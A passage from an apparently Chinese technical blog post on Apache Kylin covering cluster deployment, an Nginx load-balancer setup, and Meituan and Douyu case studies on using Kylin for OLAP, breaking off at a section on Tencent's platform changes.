class="line">Stopping Kylin: 25964</span><br><span class="line">Stopping in progress. Will check after 2 secs again...</span><br><span class="line">Kylin with pid 25964 has been stopped.</span><br></pre></td></tr></table></figure><p>您可以运行 <code>ps -ef | grep kylin</code> 来查看 Kylin 进程是否已停止。</p><h4 id="HDFS-目录结构"><a href="#HDFS-目录结构" class="headerlink" title="HDFS 目录结构"></a>HDFS 目录结构</h4><p>Kylin 会在 HDFS 上生成文件，根目录是 “/kylin/”, 然后会使用 Kylin 集群的元数据表名作为第二层目录名，默认为 “kylin_metadata” (可以在<code>conf/kylin.properties</code>中定制).</p><p>通常, <code>/kylin/kylin_metadata</code> 目录下会有这么几种子目录：<code>cardinality</code>, <code>coprocessor</code>, <code>kylin-job_id</code>, <code>resources</code>, <code>jdbc-resources</code>.<br> \1. <code>cardinality</code>: Kylin 加载 Hive 表时，会启动一个 MR 任务来计算各个列的基数，输出结果会暂存在此目录。此目录可以安全清除。<br> \2. <code>coprocessor</code>: Kylin 用于存放 HBase coprocessor jar 的目录；请勿删除。<br> \3. <code>kylin-job_id</code>: Cube 计算过程的数据存储目录，请勿删除。 如需要清理，请遵循 <a href="http://kylin.apache.org/docs/howto/howto_cleanup_storage.html" target="_blank" rel="noopener">storage cleanup guide</a>.<br> \4. <code>resources</code>: Kylin 默认会将元数据存放在 HBase，但对于太大的文件（如字典或快照），会转存到 HDFS 的该目录下，请勿删除。</p><p>\5. <code>jdbc-resources</code>：性质同上，只在使用 MySQL 做元数据存储时候出现。</p><h3 id="2-6-集群模式部署"><a href="#2-6-集群模式部署" class="headerlink" title="2.6 集群模式部署"></a>2.6 集群模式部署</h3><p>Kylin 实例是无状态的服务，运行时的状态信息存储在 HBase metastore 中。 出于负载均衡的考虑，可以启用多个共享一个 metastore 的 Kylin 实例，使得各个节点分担查询压力且互为备份，从而提高服务的可用性。</p><p>下图描绘了 Kylin 集群模式部署的一个典型场景：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8vblwtlk5j20iu0bltdn.jpg" alt="2.png"></p><p>将多个 Kylin 节点组成集群，先确保他们使用同一个 Hadoop 集群、HBase 集群。然后在每个节点的配置文件 <code>$KYLIN_HOME/conf/kylin.properties</code> 中执行下述操作：</p><ol><li>配置相同的 <code>kylin.metadata.url</code> 值，即配置所有的 Kylin 节点使用同一个 HBase metastore。</li><li>配置 Kylin 节点列表 <code>kylin.server.cluster-servers</code>，包括所有节点（包括当前节点），当事件变化时，接收变化的节点需要通知其他所有节点（包括当前节点）。</li><li>配置 Kylin 节点的运行模式 <code>kylin.server.mode</code>，参数值可选 <code>all</code>, <code>job</code>, <code>query</code> 中的一个，默认值为 <code>all</code>。<pre><code>`job` 模式代表该服务仅用于任务调度，不用于查询；`query` 模式代表该服务仅用于查询，不用于构建任务的调度；`all` 模式代表该服务同时用于任务调度和 SQL 查询。</code></pre></li></ol><p><strong>注意：</strong>默认情况下只有<strong>一个实例</strong>用于构建任务的调度 （即 <code>kylin.server.mode</code>设置为 <code>all</code> 或者 <code>job</code> 模式）。</p><h4 id="任务引擎高可用"><a href="#任务引擎高可用" class="headerlink" title="任务引擎高可用"></a>任务引擎高可用</h4><p>从 v2.0 开始, Kylin 支持多个任务引擎一起运行，相比于默认单任务引擎的配置，多引擎可以保证任务构建的高可用。</p><p>使用多任务引擎，可以在多个 Kylin 节点上配置它的角色为 <code>job</code> 或 <code>all</code>。为了避免它们之间产生竞争，需要启用分布式任务锁，需在 <code>kylin.properties</code> 里配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kylin.job.scheduler.default=2</span><br><span class="line">kylin.job.lock=org.apache.kylin.storage.hbase.util.ZookeeperJobLock</span><br></pre></td></tr></table></figure><p>并记得将所有任务和查询节点的地址注册到 <code>kylin.server.cluster-servers</code>。</p><h4 id="安装负载均衡器"><a href="#安装负载均衡器" class="headerlink" title="安装负载均衡器"></a>安装负载均衡器</h4><p>为了将查询请求发送给集群而非单个节点，可以部署一个负载均衡器，如<a href="http://nginx.org/en/" target="_blank" rel="noopener">Nginx</a>等，使得客户端和负载均衡器通信代替和特定的 Kylin 实例通信。</p><p>1.安装依赖包</p><p>yum -y install gcc zlib zlib-devel pcre-devel openssl openssl-devel</p><p>2.下载并解压安装包</p><p>mkdir -p /usr/local/nginx</p><p>//下载tar包</p><p>wget <a href="http://nginx.org/download/nginx-1.13.7.tar.gz" target="_blank" rel="noopener">http://nginx.org/download/nginx-1.13.7.tar.gz</a></p><p>tar -zxvf nginx-1.13.7.tar.g</p><p>3.安装nginx</p><p>//进入nginx-1.13.7目录</p><p>//执行命令</p><p>./configure –prefix=/usr/local/nginx</p><p>//执行make命令</p><p>make</p><p>//执行make install命令</p><p>make install</p><p>4.配置nginx.conf</p><p># 打开配置文件</p><p>vi /usr/local/nginx/conf/nginx.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#gzip  on;</span><br><span class="line">   upstream kylinserver &#123;</span><br><span class="line">     server 172.16.0.125:7070 weight=5 max_fails=5 fail_timeout=600s;</span><br><span class="line">     server 172.16.0.127:7070 weight=5 max_fails=5 fail_timeout=600s;</span><br><span class="line">     server 172.16.0.128:7070 weight=5 max_fails=5 fail_timeout=600s;</span><br><span class="line">   &#125;</span><br><span class="line">   server &#123;</span><br><span class="line">       listen       8087;</span><br><span class="line">       server_name  172.16.0.125;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           #root   html;</span><br><span class="line">           #index  index.html index.htm;</span><br><span class="line">          proxy_pass http://kylinserver;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       location /kylin &#123;</span><br><span class="line">           proxy_pass http://kylinserver;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/bec9bff2ly1g8vcz4iabpj20e20ckt8q.jpg" alt="3"></p><p>检查配置文件是否正确：/usr/local/nginx/sbin/nginx -t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动：/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>重启：/usr/local/nginx/sbin/nginx -s reload</p><p>查看进程：ps -ef | grep nginx</p><p>从容停止：kill -QUIT 进程号</p><p>快速停止：kill -TERM 进程号</p><p>强制停止：pkill -9 nginx</p><h2 id="第三章-快速入门"><a href="#第三章-快速入门" class="headerlink" title="第三章 快速入门"></a>第三章 快速入门</h2><p><a href="https://www.jianshu.com/p/c49c61b654da" target="_blank" rel="noopener">参考链接</a></p><h2 id="第四章-Kylin实例调研"><a href="#第四章-Kylin实例调研" class="headerlink" title="第四章 Kylin实例调研"></a>第四章 Kylin实例调研</h2><p>从业务层面来讲，OLAP一般分为两个种类。</p><p><strong>即席查询</strong>： 即席查询（Ad Hoc）是用户根据自己的需求，灵活的选择查询条件，系统能够根据用户的选择生成相应的统计报表。即席查询与普通应用查询最大的不同是普通的应用查询是定制开发的，而即席查询是由用户自定义查询条件的。 </p><p>就是用户通过手写SQL来完成一些临时的数据分析需求，这类需求的SQL形式多变，逻辑复杂，对相应时间没有严格的眼球。</p><p><strong>固化查询</strong>：对一些固化下来的取数，看数的需求，通过数据产品的形式提供给用户，从而提高数据分析和运行效率。这类SQL有固定的模式，对相应时间有较高要求。</p><h3 id="美团大规模使用Kylin的例子："><a href="#美团大规模使用Kylin的例子：" class="headerlink" title="美团大规模使用Kylin的例子："></a>美团大规模使用Kylin的例子：</h3><p>随着公司业务数据量和复杂度的不断提升 ，第二种方案会出现几个突出的问题：</p><ol><li><p>随着维度的不断增加，在数仓中维护各种维度组合的聚合表的成本越来越高，数据开发效率明显下降; </p></li><li><p>数据量超过千万行后，MySQL的导入和查询变得非常慢，经常把MySQL搞崩，DBA的抱怨很大;</p></li><li><p>由于大数据平台缺乏更高效率的查询引擎，查询需求都跑在Hive/Presto上，导致集群的计算压力大，跟不上业务需求的增长。</p></li></ol><p>目前OLAP引擎种类还有挺多，目前还没有一个西永能够满足各种场景的查询需求，本质是：没有一个能在数据量、性能、灵活性三个方面做到完美，每个西永在设计时都需要在这三者间做出取舍。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8we03d0ryj20hh06r41n.jpg" alt="1.png"></p><p>例如:</p><p>MPP架构的系统（Presto/Impala/SparkSQL/Drill等）有很好的数据量和灵活性支持，但是对响应时间是没有保证的。当数据量和计算复杂度增加后，响应时间会变慢，从秒级到分钟级，甚至小时级都有可能。</p><p>搜索引擎架构的系统（Elasticsearch等）相对比MPP系统，在入库时将数据转换为倒排索引，采用Scatter-Gather计算模型，牺牲了灵活性换取很好的性能，在搜索类查询上能做到亚秒级响应。但是对于扫描聚合为主的查询，随着处理数据量的增加，响应时间也会退化到分钟级。 </p><p>预计算系统 （Druid/Kylin等）则在入库时对数据进行预聚合，进一步牺牲灵活性换取性能，以实现对超大数据集的秒级响应。<br>对这些特点有了了解，针对不用的场合才知道选择什么。</p><p>典型的使用场景：</p><ul><li>数据以离线生产为主，数据量在千万到百亿之间级别。</li><li>需要多维度任意组合的。</li><li>指标中包含大量去重主表，要求结果精确的。</li><li>相应时间要求：3s内</li><li>可以提供SQL接口</li></ul><p>Kylin在生产环境经过了考研，2016年初美团开始推广Kylin解决方案。一年后覆盖了所有业务线，成为OLAP首选。</p><p>截止16年底，一年时间产生了214个Cube，包含的数据总行数2853亿行，Cube在HBase中的存储有59TB。日查询次数超过了50w次，TP50查询延迟87ms，TP99延迟1266ms，很好满足性能需求。</p><p>美团的硬件环境是：30个节点的Kylin专属Hbase集群，2台用于Cube构建的物理机，和8台8核16GVM用作Kylin的查询机。Cube的构建是运行在主计算机群的MR作业，各业务线的构建任务拆分到了他们各自的资源队列上。</p><p>Kylin对外是REST接口，我们接入了公司统一的http服务治理框架来实现负载均衡和平滑重启。 </p><p>调研的时候，看到Cube这个概念，一般都会担心“维度爆炸这个问题”，就是每增加一个维度，由于维度组合翻倍，可能会产生纬度爆炸，对预计算的算力和磁盘空间都产生很大考验，后来发现这个问题并没有想象的严重。这主要是因为：</p><p>Kylin支持Partial Cube，不需要对所有维度组合都进行预计算。</p><p>实际业务中，纬度之间往往存在衍生关系，而Kylin可以把衍生纬度的计算从预计算推迟到查询处理阶段。</p><p>以事实表上的衍生维度为例，业务中的很多维度都是(ID, NAME)成对出现的。查询时需要对ID列进行过滤，但显示时只需要取对应的NAME列。如果把这两列都作为维度，维度个数会翻倍。而在Kylin中，可以把NAME作为ID列的extendedcolumn指标，这样Cube中的维度个数就减半了。 </p><p>美团在采用衍生维度后，90%的场景可以把Cube中的维度个数（Rowkey列数）控制在20个以内。指标个数呈现长尾分布，小于10个指标的Cube是最多的，不过也有近一半的Cube指标数超过20。总共有382个去重指标，占到了总指标数的10%，绝大多数都是精确去重指标。49%的Cube膨胀率小于100%，即Cube存储量不超过上游Hive表。68%的Cube能够在1小时内完成构建，92%在2小时内完成构建。 </p><p>从美团的实践中能看出美团投入Kylin是看重的Kylin的海量数据超高查询性能的特点，虽然在磁盘空间上做了一部分牺牲，实践证明Kylin的空间换时间是可行的。</p><h3 id="斗鱼大规模使用Kylin的例子"><a href="#斗鱼大规模使用Kylin的例子" class="headerlink" title="斗鱼大规模使用Kylin的例子"></a>斗鱼大规模使用Kylin的例子</h3><p>斗鱼的这个例子，更有代表性，斗鱼随着业务的增长，在2019年Q2，平均MAU，达到1.6亿MAU，每天，超大量的用户使用斗鱼各客户端参与线上互动，斗鱼需要对客户端采集到的的性能数据进行统计和分析，开发出具有多维度分析图标和数据监控的APM（ Application Performance Monitoring，应用性能监控 ）平台。 最初，斗鱼采用了市面上非常流行的 Elasticsearch （简称 ES）实时聚合实现。运行一段时间后，基于 ES 的方案面临用户查询时间长、数据精度丢失等问题，斗鱼采用 Apache Kylin 替换 Elasticsearch， 对 APM 平台中存在的问题进行优化。不试不知道，一试吓一跳。</p><h4 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h4><p>斗鱼是一家面向大众用户的在线直播平台，每天都有超大量的终端用户在使用斗鱼各客户端参与线上互动。伴随业务的迅猛发展，斗鱼需要对客户端采集到的性能数据进行统计和分析，开发出具有多维度分析图表和数据监控的 APM （Application Performance Monitoring，应用性能监控） 平台。 </p><p>针对不同的客户端采集的不同数据，我们需要将各种维度之间相互组合并聚合，最终产出的数据变成指标在图表中展示。例如：对在时间、地域、网络环境、客户端以及 CDN 厂商等维度聚合下的各项指标情况进行<strong>多维度分析</strong>，包括客户端网络性能（包含完整请求耗时，请求耗时，响应耗时，DNS 耗时，TCP 耗时，TLS 耗时等等指标）各类错误时间段内的占比以及详细数量、状态码分布等等。图一和图二分别是两个示例： </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8xbb72l6hj20q607u0tt.jpg" alt="undefined"></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8xbbe37fxj20sg0aw43o.jpg" alt="undefined"></p><p>最初使用ES实施聚合，配合字眼多数据源统一接口（REST多数据源统一接口平台）框架，能够实现纬度指标的自由组合查询。数据采用strom实时消费kafka写入ES，醉倒了数据的事实展示，告警采用定时查询ES的方式。</p><p>运行一段时间后，ES的方案存在问题： <strong>采用 ES 实时聚合的方式，大多数时候对单个字段的聚合查询是非常快的，一旦遇到较为复杂的多维度组合查询并且聚合的数据量比较大（如数十亿），就可能会产生大量的分组，对 ES 的性能压力很大，查询时间很长（几十秒到数分钟）导致用户难以等待，还可能会遇到数据精度丢失的问题。</strong> 因此为了支撑业务， 考虑再三我们决定寻找替代方案，注意到 Apache Kylin 在大数据 OLAP 分析方面非常有优势，于是决定采用 <strong>Kylin 替换 Elasticsearch</strong>， 对斗鱼 APM 平台中存在的问题进行优化。不试不知道，一试吓一跳，效果还真的不错。 </p><h4 id="二、使用Kylin的挑战和解决方案"><a href="#二、使用Kylin的挑战和解决方案" class="headerlink" title="二、使用Kylin的挑战和解决方案"></a>二、使用Kylin的挑战和解决方案</h4><h5 id="Kylin集群的搭建"><a href="#Kylin集群的搭建" class="headerlink" title="Kylin集群的搭建"></a>Kylin集群的搭建</h5><p>斗鱼的这个需求是独立业务，所以搭建了独立集群，目前为止集群共17台机器，其中 CM 节点3台，角色包含 HDFS，YARN，Zookeeper，Hive，HBase，Kafka（主要是消费使用），Spark 2 等。其中 4 台机器上部署了 Kylin 服务，采用了 1 个 “all“ 节点，1 个 “job“ 节点，2个 “query“ 节点的模式，确保了查询节点和任务节点都互有备份，满足服务的高可用。</p><p>斗鱼客户端收集到的 APM 数据会先暂存于 Kafka 消息队列中，Kylin 支持直接从 Kafka topic 中摄入数据而不用先落 Hive，于是我们选择了这种直连 Kafka 的方式来构建实时 Cube。 </p><h5 id="构建实时Cube的问题"><a href="#构建实时Cube的问题" class="headerlink" title="构建实时Cube的问题"></a>构建实时Cube的问题</h5><p>斗鱼客户端收集到的 APM 数据会先暂存于 Kafka 消息队列中，Kylin 支持直接从 Kafka topic 中摄入数据而不用先落 Hive，于是我们选择了这种直连 Kafka 的方式来构建实时 Cube。 </p><p>1) Kafka数据格式要求：</p><p> Kylin 的实时 Cube 需要配置基于 Kafka topic 的 Streaming Table (将 Kafka topic 映射成一张普通表）。这一步不同于基于 Hive 的数据表（Kylin 可以直接从 Hive metastore 获取表的字段信息），需要管理员进行一定的手工配置，才能将 Kafka 中的 JSON 消息映射成表格中的行。这一步对 Kafka 中的数据格式和字段有一定的要求，起初因为不了解这些要求，配置的 Cube 在构建时经常失败，只有少数 Cube 构建成功。也有的 Cube 很多次都构建成功，但偶尔会有失败。针对这些问题我们进行了一系列的排查和改进。现总结如下：</p><p> a. 由于我们原始数据在 kafka 中的存放格式为数组格式（JSON 字符串），所以在创建 Streaming Table 的时候会遇到下面的问题： </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8xktgl70sj20sg0bjn0p.jpg" alt="undefined"></p><p>Kylin 会将数组中识别的字段默认加上数组下标，例如图中的 0_a，0_b 等，与我们的预期不符，所以需要对数组数据进行拆分。也就是说，Kylin 期望一条消息就是一个 JSON 对象（而非数组）。</p><p>b. 我们原始数据中还有嵌套的对象类型的字段，这种类型在 Kylin Streaming Table 识别的时候也可能会有问题，同样需要规整。如 Kylin 会把嵌套格式如 “{A: {B: value}}” 识别为 A_B 的字段，如下图，所以使用起来同样也可以，这个根据业务的不同可以自由选择，可以采用将嵌套字段铺平来规避后面可能出现的问题。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8xl9j5qrcj20sg06ywfg.jpg" alt="undefined"></p><p>c. 这个是比较难发现的一个问题，就是在设计好 Cube 之后，有时会有 Cube 构建失败的情况，经过排查之后发现，是由于公司业务数据来源的特殊性（来自于客户端上报），所以可能会出现 Kafka 中字段不一致的情况。一旦出现极少数字段不一样的数据混在 Kafka 中，便极有可能让这一次的 Cube 构建失败。 </p><p>基于以上几点，我们总结，<strong>Kylin 在接入 Kafka 实时数据构建之前，一定要做好数据清洗和规整</strong>，这也是我们前期耗费大量时间踩坑的代价。数据的清洗和规整我们采用的是流处理（Storm/Flink）对 Kafka 中的数据进行对应的处理，再写入一个新的 Kafka topic 中供 Kylin 消费。 </p><p>2) 任务的定时调度</p><p>Cube 的构建任务需要调用 API，如何定时消费 kafka 的数据进行构建，以及消费 kafka 的机制究竟如何。由于对 Kylin 理解的不够，一开始建出来的 Cube 消耗性能十分严重，需要对所建的 Cube 配合业务进行剪枝和优化。</p><p>构建实时 Cube 和构建基于 Hive 的离线 Cube 有很多不一样的地方，我们在使用和摸索的过程中踩了很多坑，也有了一定的经验。</p><p>由于是近实时 Cube 构建，需要每隔一小段时间就要构建一次，采用服务器中 Kylin 主节点上部署 Crontab-job 的模式来实现。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8xlqat61cj20jf05qt8z.jpg" alt="undefined"></p><p> 调度的时间间隔也经过了多次试验，调度的时间短了，上一个任务还没有执行完，下一个就开始了，容易产生堆积，在高峰时期容易造成滚雪球式的崩塌；调度的时间长了，一次处理的数据量就会特别大，导致任务执行的时间和消耗的资源也随之增长（Kylin 取 Kafka的数据，是比较简单粗暴的从上一次调度记录的 offset 直接取到当前最新的 offset，所以间隔时间越长，数据量越多），这是一个需要平衡的事情。经过反复测试使用，以及官方相应的介绍下，我们发现任务执行时间在 10~20 分钟为最优解，当然根据数据量的不同会有不同的调整。 </p><p> 3）Kylin 的剪枝与优化 </p><p>由于业务比较复杂，每个 Cube 的维度可能特别的多，随着维度数目的增加 Cuboid 的数量会爆炸式的增长。例如 WEB 端网络性能分析的 Cube 维度可能达到 47 个，如果采用全量构建，每一个可能情况都需要的话，最多可能构建 2 的 47 次方，也就是1.4 * 10^14 种组合，这肯定是不能接受的。所以在 Cube 设计的时候一定要结合业务进行优化和剪枝。</p><p>首先是筛选，将原始数据中根据不同的业务，选择不同的字段进行设计，以Ajax性能分析为例，选择出需要使用的 25 种维度。<strong>（2^47 -&gt; 2^25）</strong></p><p>接下来是分组，将 25 种维度按照不同的场景进行分组，例如，地域相关的可以放在一起，浏览器相关的也能分为一组。我们将场景分为了 4 组，将指数增长拆分为多个维度组之和。<strong>好的分组可以有效的减少计算复杂度，但是没有设计好的分组，很可能会由于设计问题没有覆盖好各种场景，导致查询的时候需要二次聚合，导致查询的性能很差，这里需要重点注意。（2^25 -&gt; 2^12 + 2^13 + 2^14 + 2^13）</strong></p><p> 然后是层级维度（Hierarchy Dimensions）、联合维度（Joint Dimensions）和必要维度（Mandatory Dimensions）的设置。这三个官网和网上都有大量的说明，这里不加赘述。最终实现 Kylin 的剪枝，来减少计算的成本。 </p><p>最后是 Kylin 本身一系列的配置上的优化，这些针对各自业务和集群可以参照官方文档进行调参优化。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8xlrfg7plj20sg0b6ahm.jpg" alt="undefined"></p><h5 id="Kylin集群优化"><a href="#Kylin集群优化" class="headerlink" title="Kylin集群优化"></a>Kylin集群优化</h5><p>起初我们为 Kylin 集群申请的机器类型是计算密集型，没有足够的本地存储空间。Kylin 在运行的过程中磁盘经常满了，常常需要手动清理机器。同时在前期运行的过程中时不时会出现「Kylin 服务挂了（或者管理端登不上）」，「HBase 挂了」等等情况，针对遇到的这几个问题，我们有一些解决的措施。</p><p>1）<strong>磁盘不足。</strong>因为 Kylin 在构建 Cube 的时候，会产生大量的临时文件，而且其中有部分临时文件 Kylin 是不会主动删除的，所以机器经常会出现磁盘空间不足的问题（也跟我们计算型机器磁盘空间小有关）。</p><p>解决办法：采用定时自动清除，和手动调动 API 清除临时文件，扩容 2 台大容量机器调整 Reblance 比例（这才彻底解决这个问题）。</p><p>2）<strong>服务不稳定。</strong>刚开始的时候集群部分角色总是挂起（例如 HDFS、HBase 和 Kylin 等），排查发现是由于每台机器存在多个角色，角色分配的内存之和大于机器的可用内存，当构建任务多时，可能导致角色由于内存问题挂掉。</p><p>解决办法：对集群中各个角色重新分配，通过扩容可以解决一切资源问题。添加及时的监控，由于 Kylin 不在 CM 中管理，需要添加单独的监控来判断 Kylin 进程是否挂掉或者卡住，一旦发现需要重启 Kylin。要注意有 job 的节点重启时需要设置好 kafka 安装路径。</p><h5 id="HBase超时优化"><a href="#HBase超时优化" class="headerlink" title="HBase超时优化"></a>HBase超时优化</h5><p> Kylin 在后期维护中，经常会有任务由于 operationTimeout 导致任务失败。如图： </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8xlxz8a4ej20sg06taf5.jpg" alt="undefined"></p><p> 这个报错让 Cube 构建常常失败，且一旦构建失败超过一定的次数，该 Cube 就不会继续构建了，影响到了业务的使用，针对此问题也进行了相应的排查，发现是构建的时候，可能会由于 HBase 连接超时或者是连接数不够造成任务失败。需要在 CM 中调整 HBase 相关参数。包括调整 hbase.rpc.timeout 和 hbase.client.operation.timeout 到 50000 等（之前是 30000，可以根据业务不不同自行调整，如果还有超时可以优化或者继续调整）。 </p><h5 id="已有-Cube-的修改"><a href="#已有-Cube-的修改" class="headerlink" title="已有 Cube 的修改"></a>已有 Cube 的修改</h5><p>由于业务的迭代，新增了几个维度和指标需要增加在已存在的Cube上，又例如原先 Cube 设计上有一些不足需要修改。在这方面例如 DataSource 没有修改功能，新旧 Cube 如何切换，修改经常没有响应等等问题让我们十分为难。</p><p>已有 Cube 的修改是目前使用 Kylin 最为头疼的地方。虽然 Kylin 支持 Hybrid model 来支持一定程度的修改，但是在使用的过程中因为</p><p>各种各样的原因，例如 Streaming Table 无法修改来新增字段等，还是未能修改成功。</p><p>目前采用的修改模式为，重新设计一整套从 DataSource 到 Model 再到 Cube，停止之前 Cube 的构建任务，开始新 Cube 的构建调度。使用修改我们 Java 代码的方式动态的选择查询新 Cube 还是旧 Cube，等到一定的时间周期之后再废弃旧 Cube。目前这种方式的弊端在于查询时间段包含新旧时，需要在程序中拼接数据，十分麻烦且会造成统计数据不准。所以在设计之初就要多考虑一下后面的扩展，可以先预留几个扩展字段。</p><p>用SPA如今稳进死                                                                                                                                                                                                                                           </p><h4 id="三、效果对比"><a href="#三、效果对比" class="headerlink" title="三、效果对比"></a>三、效果对比</h4><h5 id="对比表格"><a href="#对比表格" class="headerlink" title="对比表格"></a>对比表格</h5><table><thead><tr><th>条件</th><th>Apache Kylin</th><th>ES实时聚合</th><th><strong>Hive</strong> 离线任务再入  MySQL</th></tr></thead><tbody><tr><td>查询速度</td><td>较快，一般在亚秒级别。从HBase中选择适合的纬度，Cube设计的好的话不存在二次聚合，也不会有速度方面的问题。</td><td><strong>慢，可能有几分钟。</strong>实时聚合，在复杂的情况下有严重的性能问题，查询的时间可能到几分钟。</td><td><strong>快，一般在毫秒级。</strong>计算好的数据基于  MySQL 查询，一般不会有性能问题。</td></tr><tr><td>时效性</td><td>近实时，一般在30分钟以内。延迟主要取决于任务调度的时间，但是一般都会在10~30分钟左右。</td><td><strong>实时，一般延迟在秒级。</strong>ES的延迟是取决于上游数据的写入延迟和数据刷新的时间，一般可以控制在秒级。</td><td><strong>离线，一般是T+1延迟。</strong>离线数据由于同步和计算的关系，一般都是+1小时延迟或者是+1天延迟。</td></tr><tr><td>开发难度</td><td>较简单。实时数据需要先进行一系列的清洗和规整，后面只需要配置即可，不过 Cube 设计有一定的难度。</td><td><strong>简单。</strong>只需要写入数据即可，配合已有的EST框架可以任意组合满足业务需要。</td><td><strong>工作量极大。</strong>针对每一种维度组合，都需要手动开发任务来进行计算和存储。</td></tr><tr><td>资源消耗</td><td>一般。单独搭建的集群，不会对其他业务造成影响，但是集群资源需求还是比较大。</td><td><strong>一般。</strong>查询和写入一旦量大复杂后对集群上其他的查询会带来影响。</td><td><strong>一般。</strong>在大集群上跑  YARN 任务，对集群整体影响不大。</td></tr><tr><td>可拓展性</td><td><strong>不太好扩展。</strong>针对已经建好的  DataSource、Model 和 Cube 的修改比较不友好，但是有解决的办法。</td><td><strong>可扩展性较强。</strong>所有的修改只需修改Index模板，下一周期生效即可。</td><td><strong>基本无法扩展。</strong>每次有新的业务需求需要重新开发任务。</td></tr><tr><td>容错性</td><td><strong>较差。</strong>对数据的格式和类型要求较为严格，容易导致构建失败。</td><td><strong>较差。</strong>字段不一致会带来冲突，导致字段无法聚合，且冲突一旦在索引中生成，该索引将无法解决，只有等待下一周期或删除索引。</td><td><strong>较好。</strong>对字段类型和数据字段有一定的容错性。</td></tr><tr><td>数据查询复杂度</td><td><strong>十分简单。</strong>Kylin 会根据条件自动识别就是在哪一个 Cuboid 中查询数据，只需要使用 SQL 即可，跨 Cuboid 的查询也可以自动二次聚合，SQL 也可以直接配合 EST 框架。</td><td><strong>较为容易。</strong>配合 EST 框架查询十分容易，但是由于索引有小时和天后缀，需要在程序中进行判断，才能有效降低查询量。</td><td><strong>十分困难。</strong>由于每个维度存储组合存储的表都不一样，导致存储结构十分复杂，查询的时候需要自己判断在那张表里面，难度很大。</td></tr></tbody></table><h5 id="Tips-Impala速度快的原因"><a href="#Tips-Impala速度快的原因" class="headerlink" title="Tips: Impala速度快的原因"></a>Tips: Impala速度快的原因</h5><p>impala采用了MPP查询引擎(Massively Parallel Processor)， 在数据库非共享集群中，每个节点都有独立的磁盘存储系统和内存系统，业务数据根据数据库模型和应用特点划分到各个节点上，每台数据节点通过专用网络或者商业通用网络互相连接，彼此协同计算，作为整体提供数据 库服务。非共享数据库集群有完全的可伸缩性、高可用、高性能、优秀的性价比、资源共享等优势。 </p><p>Elasticsearch也是一种MPP架构的数据库，Presto、Impala等都是MPP engine，各节点不共享资源，每个executor可以独自完成数据的读取和计算，缺点在于怕stragglers，遇到后整个engine的性能下降到该straggler的能力，所谓木桶的短板，这也是为什么MPP架构不适合异构的机器，要求各节点配置一样。 </p><h4 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h4><p>之前ES需要90s完成的查询，使用Kylin只需要2-3s，原来需要加载几分钟的仪表盘，现在只需要几秒钟就能加载完成，速度提升30多倍。</p><p>在开发效率上，切换至 Kylin 在前期不熟悉的情况下的确走了一些弯路，踩了不少坑（跟数据质量、对 Kylin 原理的掌握等都有关）。但是后面在熟悉之后便可以有不逊色于 ES 的开发效率，用起来非常不错。</p><p>目前版本的 Kylin 也有一些不足，例如数据的时效性，因为 Kylin 2.x 的流数据源只能达到准实时（Near Real-time），准实时延迟通常在十几到几十分钟的，对 APM 系统中的实时告警模块还不能满足业务要求。所以目前实时告警这一块走的还是ES，由于告警只需要对上个短暂周期（1~5 分钟）内的数据做聚合，数据量较小，ES 对此没有性能问题倒能承受。对于海量历史数据，通过 Kylin 来查询的效果更好。</p><p>新系统于 2018 年 11 月正式上线，目前已经稳定运行近一年。我们也注意到 Kylin 3.0 已经在实时统计上开始发力，能够做到 ES 这样的秒级延迟，我们会持续关注，希望 Kylin 可以发展的越来越好。</p><h2 id="第五章-Kylin在腾讯的平台化及Flink引擎实践"><a href="#第五章-Kylin在腾讯的平台化及Flink引擎实践" class="headerlink" title="第五章 Kylin在腾讯的平台化及Flink引擎实践"></a>第五章 Kylin在腾讯的平台化及Flink引擎实践</h2><p>Kylin 现有的用户管理、资源隔离机制并不能满足我们需求，基于此，腾讯对 Kylin 进行了平台化改造。希望平台化改造完成后，在下面这些层面，能够有一些改进：</p><ul><li>用户管理</li><li>资源隔离</li><li>易用性提升</li><li>方便运维</li></ul><h3 id="用户管理："><a href="#用户管理：" class="headerlink" title="用户管理："></a>用户管理：</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g92byqbpinj20sg0enq3v.jpg" alt="undefined"></p><p>为了便于系统的管理及安全，公司内部有一套自己的认证系统，而且需要用个人账号去验证，所以 Kylin 作为一个平台对外提供服务的话，也需要接入到该系统。所以，我们新增了一个用户管理界面，该界面展示了 Kylin 平台内的所有用户。管理员可以新增任一用户到 Kylin 